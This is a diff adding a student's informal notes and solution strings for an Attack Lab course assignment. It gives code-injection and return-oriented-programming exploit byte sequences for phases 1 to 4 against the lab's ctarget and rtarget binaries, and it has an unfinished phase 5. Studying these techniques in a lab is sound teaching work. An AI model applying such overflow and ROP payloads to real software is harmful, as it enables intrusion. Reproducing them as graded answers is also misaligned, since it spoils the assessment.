@@ -1,0 +1,137 @@
+l/*Notes Attack Lab */
+
+/* Phase 1: Padding = 24 bytes */
+objdump -d rtarget > rtarget_dump.txt
+
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+*/ insert touch1 address */
+
+4a 12 40 00 00 00 00 00
+
+cat solutions_phase1.txt | ./hex2raw | ./ctarget
+or
+./hex2raw < phase1.txt > raw-phase1.txt
+
+
+user@cu-cs-vm:~/Desktop/target750$ vim cookie.txt
+user@cu-cs-vm:~/Desktop/target750$ vim phase2.s
+user@cu-cs-vm:~/Desktop/target750$ gcc -c phase2.s 
+user@cu-cs-vm:~/Desktop/target750$ objdump -d phase2.o 
+user@cu-cs-vm:~/Desktop/target750$ vim cookie.txt
+user@cu-cs-vm:~/Desktop/target750$ vim phase2.s
+user@cu-cs-vm:~/Desktop/target750$ gcc -c phase2.s 
+user@cu-cs-vm:~/Desktop/target750$ objdump -d phase2.o 
+
+Phase 2 involves injecting a small code and calling function touch2 while making it look like you passed the cookie as an argument to touch2
+So our goal is to modify the %rdi register and store our cookie in there.
+
+Phase2 : Create .s file with the address found in cookie txt for phase2;
+gcc -c phase2.s
+objdump -d phase2.o
+open phase2.o
+copy paste disassembly test to phase2.asm.
+
+find 0x0000000000401240
+until *0x0000000000401240
+
+Type:string  (Enter string greater than 24)
+x/s $rsp
+$rsp = 0x556471f8
+
+then enter address of phase2 funct
+
+cat solutions_phase2.txt | ./hex2raw | ./ctarget
+
+48 c7 c7 70 4b 4b 43 c3 /*this sets your cookie*/
+00 00 00 00 00 00 00 00 /*padding to make it 24 bytes*/
+00 00 00 00 00 00 00 00 /*padding to make it 24 bytes*/
+d8 0c 62 55 00 00 00 00 /* address of register %rsp */
+8c 17 40 00 00 00 00 00 /*address of touch2 function */
+
+
+
+Phaze 3:
+
+we are trying to call the function touch3 and have to pass our cookie to it as string
+buffer + 8 bytes for return address of rsp + 8 bytes for touch3
+24+8+8 = 40 or 0x28
+
+in solutions file:
+movq $0x55647220,%rdi /*%rsp + 0x18 */
+retq
+
+48 c7 c7 00 0d 62 55 c3 /*rsp + 28 the address where the cookie is present*/
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /*padding*/
+d8 0c 62 55 00 00 00 00 /* return address ($rsp)*/
+7f 19 40 00 00 00 00 00 /* touch3 address -- get this from the rtarget dump file */
+34 33 34 62 34 62 37 30 /* cookie string*/
+
+cat solutions_phase3.txt | ./hex2raw | ./ctarget
+
+Phase 4:
+
+Search for 58 between start farm and end farm
+popq %rdi is given in the the pdf and it's byte representation is 5f, since we don't have 5f byte in the dump file, 
+we will look for a substitute which is popq %rax% with byte representation of 58
+
+The other instruction you need is: movq %rax %edi and it's byte representation is 48 89 c7 c3 : FOUND at setval_281
+
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* first 24(buffer size) bytes here are just padding */
+f2 18 40 00 00 00 00 00 /* gadget 1: popq %rax address starts at last byte */
+70 4b 4b 43 00 00 00 00 /* cookie */
+09 19 40 00 00 00 00 00 /* gadget 2: move %rax to %rdi */
+8c 17 40 00 00 00 00 00 /* touch2 address
+
+cat solutions_phase4.txt | ./hex2raw | ./rtarget
+
+
+
+Phase 5:
+401ba4:	48 89 e0  mov  %rsp,%rax
+404b52:	48 89 c7  mov  %rax,%rdi
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
